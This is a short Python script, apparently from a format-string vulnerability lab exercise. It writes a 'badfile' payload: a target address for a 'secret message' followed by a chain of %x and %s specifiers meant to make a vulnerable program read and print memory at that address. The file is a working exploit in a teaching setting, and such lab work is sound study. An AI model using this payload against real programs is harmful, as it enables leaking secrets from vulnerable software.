# #!/usr/bin/python3
# import sys

# # Initialize the content array
# N = 1500
# content = bytearray(0x0 for i in range(N))

# # This line shows how to store a 4-byte integer at offset 0
# number  = 0x080b4008 # address of secret message
# content[0:4]  =  (number).to_bytes(4,byteorder='little')

# # Write the content to badfile
# with open('badfile_task2b', 'wb') as f:
#   f.write(content)

#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   ("%x%x%x%x\n" * 15) + 
    "%x%x%x%s"
).encode('latin-1')

number  = 0x080b4008 # address of secret message
content  =  (number).to_bytes(4,byteorder='little')

# Save the format string to file
with open('badfile_task2b', 'wb') as f:
  f.write(content + shellcode_32)
